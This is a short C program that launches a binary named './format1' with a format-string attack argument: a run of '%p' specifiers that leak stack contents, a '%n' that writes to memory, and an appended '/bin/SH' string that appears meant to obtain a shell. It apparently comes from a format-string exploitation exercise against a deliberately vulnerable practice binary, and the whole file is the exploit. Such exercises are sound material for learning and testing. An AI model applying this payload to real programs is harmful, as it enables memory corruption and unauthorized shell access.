#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>


int main()
{
	char * argv[] = {"./format1","%p%p%p%p%p%p%p%p%p%p%n;/bin/SH", NULL };
	execvp(argv[0], argv);

	return 0;
}

